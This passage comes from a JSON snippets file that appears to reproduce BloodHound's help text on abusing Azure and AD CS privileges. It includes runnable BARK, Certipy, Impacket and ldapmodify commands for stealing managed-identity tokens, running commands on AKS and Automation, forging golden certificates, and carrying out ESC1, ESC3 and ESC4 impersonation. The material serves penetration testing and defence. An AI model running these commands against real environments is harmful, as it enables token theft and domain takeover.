            "$$MGToken = Get-GraphTokenWithRefreshToken `",
            "-RefreshToken \"0.ARwA6WgJJ9X2qk\u2026\" `",
            "-TenantID \"contoso.onmicrosoft.com\"",
            "```",
            "To add a new owner to a Service Principal, use BARK's New-ServicePrincipalOwner function:",
            "```sh",
            "New-ServicePrincipalOwner `",
            "-ServicePrincipalObjectId \"082cf9b3-24e2-427b-bcde-88ffdccb5fad\" `",
            "-NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `",
            "-Token $$Token",
            "```",
            "To add a new owner to an App Registration, use BARK's New-AppOwner function:",
            "```sh",
            "New-AppOwner `",
            "-AppObjectId \"52114a0d-fa5b-4ee5-9a29-2ba048d46eee\" `",
            "-NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `",
            "-Token $$Token",
            "```"
        ]
    },
    "AZAKSContributor common abuse (bloodhound)": {
        "description": "The Azure Kubernetes Service Contributor role grants full control of the target Azure Kubernetes Service Managed Cluster. This includes the ability to remotely fetch administrator credentials for the cluster as well as the ability to execute arbitrary commands on compute nodes associated with the AKS Managed Cluster.",
        "prefix": "AZAKSContributor",
        "body": [
            "The Azure Kubernetes Service Contributor role grants full control of the target Azure Kubernetes Service Managed Cluster. This includes the ability to remotely fetch administrator credentials for the cluster as well as the ability to execute arbitrary commands on compute nodes associated with the AKS Managed Cluster.",
            "To Abuse 'AZAKSContributor' commonly: ",
            "You can use BARK's Invoke-AzureRMAKSRunCommand function to execute commands on compute nodes associated with the target AKS Managed Cluster.",
            "This function requires you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to execute commands on the cluster. There are several ways to acquire a JWT. For example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:",
            "```sh",
            "$$ARMToken = Get-ARMTokenWithRefreshToken `",
            "-RefreshToken \"0.ARwA6WgJJ9X2qk\u2026\" `",
            "-TenantID \"contoso.onmicrosoft.com\"",
            "```",
            "Now you can use BARK's Invoke-AzureRMAKSRunCommand function to execute a command against the target AKS Managed Cluster. For example, to run a simple \"whoami\" command:",
            "```sh",
            "Invoke-AzureRMAKSRunCommand `",
            "-Token $$ARMToken `",
            "-TargetAKSId \"/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster\" `",
            "-Command \"whoami\"",
            "```",
            "If the AKS Cluster or its associated Virtual Machine Scale Sets have managed identity assignments, you can use BARK's Invoke-AzureRMAKSRunCommand function to retrieve a JWT for the managed identity Service Principal like this:",
            "```sh",
            "Invoke-AzureRMAKSRunCommand `",
            "-Token $$ARMToken `",
            "-TargetAKSId \"/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster\" `",
            "-Command 'curl -i -H \"Metadata: true\" \"http://169.254.169.254/metadata/identity/oauth2/token?resource=https://graph.microsoft.com/&api-version=2019-08-01\"'",
            "```",
            "If successful, the output will include a JWT for the managed identity service principal."
        ]
    },
    "AZAutomationContributor common abuse (bloodhound)": {
        "description": "The Azure Automation Contributor role grants full control of the target Azure Automation Account. This includes the ability to execute arbitrary commands on the Automation Account.",
        "prefix": "AZAutomationContributor",
        "body": [
            "The Azure Automation Contributor role grants full control of the target Azure Automation Account. This includes the ability to execute arbitrary commands on the Automation Account.",
            "To Abuse 'AZAutomationContributor' commonly: ",
            "You can use BARK's New-AzureAutomationAccountRunBook and Get-AzureAutomationAccountRunBookOutput functions to execute arbitrary commands against the target Automation Account.",
            "These functions require you to supply an Azure Resource Manager scoped JWT associated with the principal that has the privilege to add or modify and run Automation Account run books. There are several ways to acquire a JWT. For example, you may use BARK's Get-ARMTokenWithRefreshToken to acquire an Azure RM-scoped JWT by supplying a refresh token:",
            "```sh",
            "$$ARMToken = Get-ARMTokenWithRefreshToken `",
            "-RefreshToken \"0.ARwA6WgJJ9X2qk\u2026\" `",
            "-TenantID \"contoso.onmicrosoft.com\"",
            "```",
            "Now you can use BARK's New-AzureAutomationAccountRunBook function to add a new runbook to the target Automation Account, specifying a command to execute using the -Script parameter:",
            "```sh",
            "New-AzureAutomationAccountRunBook `",
            "-Token $$ARMToken `",
            "-RunBookName \"MyCoolRunBook\" `",
            "-AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\" `",
            "-Script \"whoami\"",
            "```",
            "After adding the new runbook, you must execute it and fetch its output. You can do this automatically with BARK's Get-AzureAutomationAccountRunBookOutput function:",
            "```sh",
            "Get-AzureAutomationAccountRunBookOutput `",
            "-Token $$ARMToken `",
            "-RunBookName \"MyCoolRunBook\" `",
            "-AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\"",
            "```",
            "If the Automation Account has a managed identity assignment, you can use these two functions to retrieve a JWT for the service principal like this:",
            "```sh",
            "$$Script = $$tokenAuthURI = $$env:MSI_ENDPOINT + \"?resource=https://graph.microsoft.com/&api-version=2017-09-01\"; $$tokenResponse = Invoke-RestMethod -Method Get -Headers @{\"Secret\"=\"$$env:MSI_SECRET\"} -Uri $$tokenAuthURI; $$tokenResponse.access_token",
            "New-AzureAutomationAccountRunBook -Token $$ARMToken -RunBookName \"MyCoolRunBook\" -AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\" -Script $$Script",
            "Get-AzureAutomationAccountRunBookOutput -Token $$ARMToken -RunBookName \"MyCoolRunBook\" -AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\"",
            "```",
            "If successful, the output will include a JWT for the managed identity service principal."
        ]
    },
    "AZKeyVaultKVContributor common abuse (bloodhound)": {
        "description": "The Key Vault Contributor role grants full control of the target Key Vault. This includes the ability to read all secrets stored on the Key Vault.",
        "prefix": "AZKeyVaultKVContributor",
        "body": [
            "The Key Vault Contributor role grants full control of the target Key Vault. This includes the ability to read all secrets stored on the Key Vault.",
            "To Abuse 'AZKeyVaultKVContributor' commonly: ",
            "You can read secrets and alter access policies (grant yourself access to read secrets)",
            "Via PowerZure:",
            "[Get-AzureKeyVaultContent](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent)",
            "[Export-AzureKeyVaultContent](https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent)"
        ]
    },
    "AZLogicAppContributor common abuse (bloodhound)": {
        "description": "The Logic Contributor role grants full control of the target Logic App. This includes the ability to execute arbitrary commands on the Logic App.",
        "prefix": "AZLogicAppContributor",
        "body": [
            "The Logic Contributor role grants full control of the target Logic App. This includes the ability to execute arbitrary commands on the Logic App.",
            "To Abuse 'AZLogicAppContributor' commonly: ",
            "Currently you need access to the portal GUI to execute this abuse.",
            "The abuse involves adding or modifying an existing logic app to coerce the logic app into sending a JWT for its managed identity service principal to a web server you control.",
            "You can see a full walkthrough for executing that abuse in this blog post:",
            "[Andy Robbins - Managed Identity Attack Paths, Part 2: Logic Apps](https://medium.com/p/52b29354fc54)"
        ]
    },
    "AZNodeResourceGroup common abuse (bloodhound)": {
        "description": "This edge is created to link Azure Kubernetes Service Managed Clusters to the Virtual Machine Scale Sets they use to execute commands on.The system-assigned identity for the AKS Cluster will have the Contributor role against the target Resource Group and its child Virtual Machine Scale Sets.",
        "prefix": "AZNodeResourceGroup",
        "body": [
            "This edge is created to link Azure Kubernetes Service Managed Clusters to the Virtual Machine Scale Sets they use to execute commands on.The system-assigned identity for the AKS Cluster will have the Contributor role against the target Resource Group and its child Virtual Machine Scale Sets.",
            "To Abuse 'AZNodeResourceGroup' commonly: ",
            "You will abuse this relationship by executing a command against the AKS Managed Cluster the edge is emiting from. You can target any managed identity assignment scoped to the Virtual Machine Scale Sets under the target Resource Group."
        ]
    },
    "Enroll linux abuse (bloodhound)": {
        "description": "The  controlled object has enrollment rights against the target node, target object.The target node may be a Certificate Template or an Enterprise Certification Authority.",
        "prefix": "Enroll",
        "body": [
            "The  $CONTROLLED has enrollment rights against the target node, $TARGET.The target node may be a Certificate Template or an Enterprise Certification Authority.",
            "To Abuse 'Enroll' on linux: ",
            "Certipy can be used to enroll a certificate:",
            "```sh",
            "certipy req -u USER@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE",
            "```",
            "The following requirements must be met for a principal to be able to enroll a certificate:",
            "1) The principal has enrollment rights on a certificate template",
            "2) The certificate template is published on an enterprise CA",
            "3) The principal has Enroll permission on the enterprise CA",
            "4) The principal meets the issuance requirements and the requirements for subject name and subject alternative name defined by the template"
        ]
    },
    "EnterpriseCAFor linux abuse (bloodhound)": {
        "description": "The  controlled object is an enterprise certification authority for target object.The Enterprise Certification Authority node is the enrollment service LDAP object for the target AIACA/Root Certification Authority node.",
        "prefix": "EnterpriseCAFor",
        "body": [
            "The  $CONTROLLED is an enterprise certification authority for $TARGET.The Enterprise Certification Authority node is the enrollment service LDAP object for the target AIACA/Root Certification Authority node.",
            "To Abuse 'EnterpriseCAFor' on linux: ",
            "An attacker may perform several attacks that rely on this relationship. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "RootCAFor linux abuse (bloodhound)": {
        "description": "The  controlled object is the root certification authority for target object.The CA is trusted as a root certification authority by the domain. Any certificates signed by this CA will be trusted by the domain and all hosts in the domain.",
        "prefix": "RootCAFor",
        "body": [
            "The  $CONTROLLED is the root certification authority for $TARGET.The CA is trusted as a root certification authority by the domain. Any certificates signed by this CA will be trusted by the domain and all hosts in the domain.",
            "To Abuse 'RootCAFor' on linux: ",
            "An attacker may perform several attacks that rely on the existence of a root CA, such as ESC1. This edge alone is not enough to escalate rights or impersonate other principals. This edge may contribute to other edges and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "PublishedTo linux abuse (bloodhound)": {
        "description": "The  controlled object is published to target object.The certificate template is published to an enterprise certification authority. This relationship means the certificate template can be used when submitting an enrollment request to the specified certification authority.",
        "prefix": "PublishedTo",
        "body": [
            "The  $CONTROLLED is published to $TARGET.The certificate template is published to an enterprise certification authority. This relationship means the certificate template can be used when submitting an enrollment request to the specified certification authority.",
            "To Abuse 'PublishedTo' on linux: ",
            "An attacker may perform several attacks that rely on a template being published to a certification authority. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "NTAuthStoreFor linux abuse (bloodhound)": {
        "description": "The NTAuthStore is the Enterprise NTAuth store (NTAuthCertificates object) for the the AD forest of the domain node. The NTAuthStore holds the list of certificates trusted for authentication in the AD forest of the domain target object. When a user attempts to authenticate against a domain with a certificate, a domain controller will verify that the certificate is signed by a certificate in the NTAuthStore.",
        "prefix": "NTAuthStoreFor",
        "body": [
            "The NTAuthStore is the Enterprise NTAuth store (NTAuthCertificates object) for the the AD forest of the domain node. The NTAuthStore holds the list of certificates trusted for authentication in the AD forest of the domain $TARGET. When a user attempts to authenticate against a domain with a certificate, a domain controller will verify that the certificate is signed by a certificate in the NTAuthStore.",
            "To Abuse 'NTAuthStoreFor' on linux: ",
            "An attacker may perform several attacks that rely on certificates being stored in the NTAuthStore, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "IssuedSignedBy linux abuse (bloodhound)": {
        "description": "The  controlled object's certificate is issued and signed by target objectWhen Windows assesses the validity and trustworthiness of a certificate it verifies the certificate chain up to a trusted root certificate. The IssuedSignedBy edge represent a link within the certificate chain.",
        "prefix": "IssuedSignedBy",
        "body": [
            "The  $CONTROLLED's certificate is issued and signed by $TARGETWhen Windows assesses the validity and trustworthiness of a certificate it verifies the certificate chain up to a trusted root certificate. The IssuedSignedBy edge represent a link within the certificate chain.",
            "To Abuse 'IssuedSignedBy' on linux: ",
            "An attacker may perform several attacks that rely on the certificate chain, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "TrustedForNTAuth linux abuse (bloodhound)": {
        "description": "The NTAuthStore contains the certificate of the Enterprise CA, controlled object. The consequence of the relationship is that certificate issued by the Enterprise CA are trusted for authentication in the AD forest of the NTAuthStore.",
        "prefix": "TrustedForNTAuth",
        "body": [
            "The NTAuthStore contains the certificate of the Enterprise CA, $CONTROLLED. The consequence of the relationship is that certificate issued by the Enterprise CA are trusted for authentication in the AD forest of the NTAuthStore.",
            "To Abuse 'TrustedForNTAuth' on linux: ",
            "An attacker may perform several attacks that rely on an Enterprise CA to be trusted, such as ESC1. This relationship alone is not enough to escalate rights or impersonate other principals. This relationship may contribute to other relationships and attributes, from which an escalation opportunity may emerge."
        ]
    },
    "HostsCAService linux abuse (bloodhound)": {
        "description": "The  controlled object hosts the enrollment service for the enterprise CA target object.The Enterprise Certification Authority node is the enrollment service LDAP object for CA hosted on the computer node.",
        "prefix": "HostsCAService",
        "body": [
            "The  $CONTROLLED hosts the enrollment service for the enterprise CA $TARGET.The Enterprise Certification Authority node is the enrollment service LDAP object for CA hosted on the computer node.",
            "To Abuse 'HostsCAService' on linux: ",
            "An attacker may perform several attacks that rely on this relationship. This relationship alone is not enough to escalate rights or impersonate other principals. The enterprise CA must chain up to a root CA of the AD forest and it must be trusted for NT authentication in the AD forest for an escalation to be possible. If both conditions are met, BloodHound will generate a GoldenCert edge from the computer node to the domain node. Check if there is an outbound GoldenCert edge from the computer node."
        ]
    },
    "DelegatedEnrollmentAgent linux abuse (bloodhound)": {
        "description": "The  controlled object is delegated the privilege to enroll certificates of the certificate template target object as an enrollment agent.The certificate template is published to an enterprise CA where the enrollment agent restrictions are configured to allow this principal to enroll certificates against this template as an enrollment agent. BloodHound does not assess what principals the enrollment agent is allowed to enroll on behalf of.",
        "prefix": "DelegatedEnrollmentAgent",
        "body": [
            "The  $CONTROLLED is delegated the privilege to enroll certificates of the certificate template $TARGET as an enrollment agent.The certificate template is published to an enterprise CA where the enrollment agent restrictions are configured to allow this principal to enroll certificates against this template as an enrollment agent. BloodHound does not assess what principals the enrollment agent is allowed to enroll on behalf of.",
            "To Abuse 'DelegatedEnrollmentAgent' on linux: ",
            "An attacker may perform an ADCS ESC3 attack that relies on this DelegatedEnrollmentAgent relationship. This relationship alone is not enough to escalate rights or impersonate other principals."
        ]
    },
    "EnrollOnBehalfOf linux abuse (bloodhound)": {
        "description": "The  controlled object can be used to enroll certificates on behalf of other principals for the certificate template target object.The certificate template controlled object is configured to be used as an enrollment agent. The certificate template target object is configured to allow enrollment by enrollment agents. Both certificate templates are published by an enterprise CA which is trusted for NT authentication and chain up to a root CA for the domain. This enables a principal with a certificate of certificate template controlled object to enroll on behalf of other principals for certificate template target object as long as enrollment agent restrictions configured on the enterprise CA permit it.",
        "prefix": "EnrollOnBehalfOf",
        "body": [
            "The  $CONTROLLED can be used to enroll certificates on behalf of other principals for the certificate template $TARGET.The certificate template $CONTROLLED is configured to be used as an enrollment agent. The certificate template $TARGET is configured to allow enrollment by enrollment agents. Both certificate templates are published by an enterprise CA which is trusted for NT authentication and chain up to a root CA for the domain. This enables a principal with a certificate of certificate template $CONTROLLED to enroll on behalf of other principals for certificate template $TARGET as long as enrollment agent restrictions configured on the enterprise CA permit it.",
            "To Abuse 'EnrollOnBehalfOf' on linux: ",
            "An attacker may perform an ADCS ESC3 attack that relies on this EnrollOnBehalfOf relationship. This relationship alone is not enough to escalate rights or impersonate other principals."
        ]
    },
    "GoldenCert linux abuse (bloodhound)": {
        "description": "The  controlled object has a certificate private key that can be abused to sign \"golden\" certificates for authentication of any enabled principal in the AD forest of domain target object.The  controlled object hosts the enrollment service of an enterprise CA which implies it has the private key of the enterprise CA's certificate. This private key allows an attacker to sign certificates for authentication as any enabled principal in the AD forest of domain target object, as the enterprise CA is trusted for NT authentication and chain up to a root CA.It may not be possible to obtain the certificate private key if it is protected with a Trusted Platform Module (TPM) or using a Hardware Security Module (HSM). However, it may still be possible to compromise the AD forest. Administrative access to the enterprise CA host lets an attacker publish certificate templates, approve denied enrollment requests, and more. The  controlled object will have an ESC7 edge to the domain target object if any such attack has been found possible by BloodHound.",
        "prefix": "GoldenCert",
        "body": [
            "The  $CONTROLLED has a certificate private key that can be abused to sign \"golden\" certificates for authentication of any enabled principal in the AD forest of domain $TARGET.The  $CONTROLLED hosts the enrollment service of an enterprise CA which implies it has the private key of the enterprise CA's certificate. This private key allows an attacker to sign certificates for authentication as any enabled principal in the AD forest of domain $TARGET, as the enterprise CA is trusted for NT authentication and chain up to a root CA.It may not be possible to obtain the certificate private key if it is protected with a Trusted Platform Module (TPM) or using a Hardware Security Module (HSM). However, it may still be possible to compromise the AD forest. Administrative access to the enterprise CA host lets an attacker publish certificate templates, approve denied enrollment requests, and more. The  $CONTROLLED will have an ESC7 edge to the domain $TARGET if any such attack has been found possible by BloodHound.",
            "To Abuse 'GoldenCert' on linux: ",
            "1) Back up the CA certificate with the credentials of a user with admin access on the enterprise CA host using Certipy:",
            "```sh",
            "certipy ca -backup -ca 'dumpster-DC01-CA' -username jd@dumpster.fire -password 'Password123!'",
            "```",
            "The enterprise CA certificate is the one where issuer and subject are identical.",
            "2) Forge a certificate of a target principal:",
            "```sh",
            "certipy forge -ca-pfx dumpster-DC01-CA.pfx -upn Roshi@dumpster.fire -subject 'CN=Roshi,OU=Users,OU=Tier0,DC=dumpster,DC=fire'",
            "```",
            "3) Request a TGT for the targeted principal using the certificate against a given DC:",
            "```sh",
            "certipy auth -pfx roshi_forged.pfx -dc-ip '192.168.100.10'",
            "```"
        ]
    },
    "ADCSESC1 linux abuse (bloodhound)": {
        "description": "This entity has the privileges to perform the ADCS ESC1 attack against the target domain.The principal has permission to enroll on one or more certificate templates, allowing them to specify an alternate subject name and use the certificate for authentication. They also have enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, along with the certificate chain up to the root CA certificate. This setup lets the principal enroll certificates for any AD forest user or computer, enabling authentication and impersonation of any AD forest user or computer without their credentials.",
        "prefix": "ADCSESC1",
        "body": [
            "This entity has the privileges to perform the ADCS ESC1 attack against the target domain.The principal has permission to enroll on one or more certificate templates, allowing them to specify an alternate subject name and use the certificate for authentication. They also have enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, along with the certificate chain up to the root CA certificate. This setup lets the principal enroll certificates for any AD forest user or computer, enabling authentication and impersonation of any AD forest user or computer without their credentials.",
            "To Abuse 'ADCSESC1' on linux: ",
            "An attacker may perform this attack in the following steps:",
            "- Step 1: Use Certipy to request enrollment in the affected template, specifying the target enterprise CA and target principal to impersonate:",
            "```sh",
            "certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC1 -upn administrator@corp.local",
            "```",
            "- Step 2: Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 1 and the IP of a domain controller:",
            "```sh",
            "certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128",
            "```"
        ]
    },
    "ADCSESC4 linux abuse (bloodhound)": {
        "description": "This entity has has the privileges to perform the ADCS ESC4 attack against the target domain.\n\nThe principal has permissions to modify the settings on one or more certificate templates, enabling the principal configure the certificate templates for ADCS ESC1 conditions, which allows them to specify an alternate subject name and use the certificate for authentication. They also has enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication and chains up to a root CA for the forest. This setup lets the principal modify the certificate templates to allow enrollment as any targeted AD forest user or computer without knowing their credentials, and impersonation of those targets by certificate authentication.",
        "prefix": "ADCSESC4",
        "body": [
            "This entity has has the privileges to perform the ADCS ESC4 attack against the target domain.\n\nThe principal has permissions to modify the settings on one or more certificate templates, enabling the principal configure the certificate templates for ADCS ESC1 conditions, which allows them to specify an alternate subject name and use the certificate for authentication. They also has enrollment permission for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication and chains up to a root CA for the forest. This setup lets the principal modify the certificate templates to allow enrollment as any targeted AD forest user or computer without knowing their credentials, and impersonation of those targets by certificate authentication.",
            "To Abuse 'ADCSESC4' on linux: ",
            "An attacker may perform the ESC4 attack with the following steps.",
            "- Step 0.1: Obtain ownership (WriteOwner only)",
            "If you only have WriteOwner on the affected certificate template, then you need to grant your principal ownership over the template first.",
            "To check the current owner of the certificate template, you may use Impacket's owneredit:owneredit.py -action read -target-dn 'template-dn' 'domain'/'attacker':'password'Change the ownership of the object:owneredit.py -action write -new-owner 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'Confirm that the ownership was changed by running the first command again.",
            "After abuse, set the ownership back to previous owner using the second command.",
            "- Step 0.2: Obtain GenericAll (WriteOwner, Owns, or WriteDacl only)",
            "If you only have WriteOwner, Owns, or WriteDacl on the affected certificate template, then you need to grant your principal GenericAll over the template.",
            "Impacket's dacledit can be used for that purpose:dacledit.py -action 'write' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'Confirm that the GenericAll ACE was added:dacledit.py -action 'read' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'After abuse, remove the GenericAll ACE you added:dacledit.py -action 'remove' -rights 'FullControl' -principal 'attacker' -target-dn 'template-dn' 'domain'/'attacker':'password'",
            "- Step 1.a: Make certificate template ESC1 abusable (GenericAll)",
            "If you have an GenericAll edge to the CertTemplate node, or if you have just granted yourself GenericAll, then you can use this step to make the template abuseable to ESC1.",
            "Use Certipy to overwrite the configuration of the certificate template to make it vulnerable to ESC1:certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-oldThe -save-old parameter is used to save the old configuration, which is used afterward for restoring the configuration:certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.jsonRestoring the configuration is vital as the the vulnerable configuration grants Full Control to Authenticated Users.",
            "The certificate template is now vulnerable to the ESC1 technique and you can continue to Step 2.",
            "- Step 1.b: Ensure the certificate template requires enrollee to specify Subject Alternative Name (SAN)(GenericWrite or WritePKINameFlag, no GenericAll).",
            "The certificate template requires the enrollee to specify SAN if the CertTemplate node's Enrollee Supplies Subject (enrolleesuppliessubject) is set to True. In that case, continue to the next step.",
            "If you have an GenericWrite or WritePKINameFlag edge to the CertTemplate node and no GenericAll permission, then use this step to set the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag.",
            "Check the current value of the msPKI-Certificate-Name-Flag attribute on the certificate template using ldapsearch and note it down for later:ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"TEMPLATE-DN\" msPKI-Certificate-Name-FlagSet the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag as the only enabled flag using ldapmodify:echo -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Certificate-Name-Flag\\nmsPKI-Certificate-Name-Flag: 1\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAMERun the first command again to confirm the attribute has been set.",
            "After abuse, set the attribute back to the original value by running the command that sets the value, but with the original value instead of 1.",
            "- Step 1.c: Ensure the certificate template does not require manager approval (GenericWrite or WritePKIEnrollmentFlag, no GenericAll).",
            "The certificate template does not require manager approval if the CertTemplate node's Requires Manager Approval (requiresmanagerapproval) is set to False. In that case, continue to the next step.",
            "If you have an GenericWrite or WritePKIEnrollmentFlag edge to the CertTemplate node and no GenericAll permission, then use this step to remove the CT_FLAG_PEND_ALL_REQUESTS flag (manager approval).",
            "Check the current value of the msPKI-Enrollment-Flag attribute on the certificate template using ldapsearch and note it down for later:ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"TEMPLATE-DN\" msPKI-Enrollment-FlagRemove all flags from msPKI-Enrollment-Flag using ldapmodify:echo -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Enrollment-Flag\\nmsPKI-Enrollment-Flag: 0\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAMERun the first command again to confirm the attribute has been set.",
            "After abuse, set the attribute back to the original value by running the command to set the value, but with the original value instead of 0.",
            "- Step 1.d: Ensure the certificate template allows for client authentication (GenericWrite, no GenericAll).",
            "The certificate template allows for client authentication if the CertTemplate node's Authentication Enabled (authenticationenabled) is set to True. In that case, continue to the next step.",
            "If you have an GenericWrite edge to the CertTemplate node and no GenericAll permission, then use this step to ensure the certificate template allows for client authentication.",
            "Check the current value of the msPKI-Certificate-Application-Policy and pKIExtendedKeyUsage attribute on the certificate template using ldapsearch and note it down for later:ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"TEMPLATE-DN\" msPKI-Certificate-Application-Policyldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"TEMPLATE-DN\" pKIExtendedKeyUsageSet the Client Authentication EKU using ldapmodify:echo -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Certificate-Application-Policy\\nmsPKI-Certificate-Application-Policy: 1.3.6.1.5.5.7.3.2\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAMEecho -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: pKIExtendedKeyUsage\\npKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAMERun the first two command again to confirm the attributes have been set.",
            "After abuse, set the attributes back to the original value by running the commands to set the values, but with the original values instead. To set multiple EKUs, use this format:echo -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: ATTRIBUTE\\nATTRIBUTE: EKU1\\nATTRIBUTE: EKU2\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME",
            "- Step 1.e: Ensure the certificate template does not require authorized signatures (GenericWrite, no GenericAll).",
            "The certificate template does not require authorized signatures if the CertTemplate node's Authorized Signatures Required (authorizedsignatures) is set to 0 or if the Schema Version (schemaversion) is 1. In that case, continue to the next step.",
            "If you have an GenericWrite edge to the CertTemplate node and no GenericAll permission, then use this step to ensure the certificate template does not require authorized signatures.",
            "The certificate template requires authorized signatures if the certificate template's msPKI-RA-Signatureattribute value is more than zero. Check the current value of the msPKI-RA-Signature attribute on the certificate template using ldapsearch and note it down for later:ldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"TEMPLATE-DN\" msPKI-RA-SignatureRemove all flags from msPKI-RA-Signature using ldapmodify:echo -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-RA-Signature\\nmsPKI-RA-Signature: 0\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAMERun the first command again to confirm the attribute has been set.",
            "After abuse, set the attribute back to the original value by running the command that sets the value, but with the original value instead of 0.",
            "- Step 2: Enroll certificate.",
            "Use Certipy to request enrollment in the affected template, specifying the target enterprise CA and target principal to impersonate:certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local",
            "- Step 3: Authenticate using certificate.",
            "Request a ticket granting ticket (TGT) from the domain, specifying the certificate created in Step 2 and the IP of a domain controller:certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128"
        ]
    },
    "ADCSESC3 linux abuse (bloodhound)": {
        "description": "This entity has the capability to perform the ADCS ESC3 attack against the domain target object.The principal has permission to enroll on a certificate allowing them to obtain an enrollment agent certificate. They also have permission to enroll for a certificate template that permits enrollment by enrollment agents and can be used for authentication. Additionally, they also have enrollment permissions for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, along with the CA certificate chain up to the root CA certificate. This setup lets the principal enroll certificates for any AD forest user or computer, enabling authentication and impersonation of any AD forest user or computer without their credentials, unless the target user or computer is protected by enrollment agent restrictions on the enterprise CA.",
        "prefix": "ADCSESC3",
        "body": [
            "This entity has the capability to perform the ADCS ESC3 attack against the domain $TARGET.The principal has permission to enroll on a certificate allowing them to obtain an enrollment agent certificate. They also have permission to enroll for a certificate template that permits enrollment by enrollment agents and can be used for authentication. Additionally, they also have enrollment permissions for an enterprise CA with the necessary templates published. This enterprise CA is trusted for NT authentication in the forest, along with the CA certificate chain up to the root CA certificate. This setup lets the principal enroll certificates for any AD forest user or computer, enabling authentication and impersonation of any AD forest user or computer without their credentials, unless the target user or computer is protected by enrollment agent restrictions on the enterprise CA.",
            "To Abuse 'ADCSESC3' on linux: ",
            "The ESC3 attack can be carried out in the following manner.",
            "- Step 1: Use Certipy to request an enrollment agent certificate.",
            "```sh",
            "certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'vulnerable template'",
            "```",
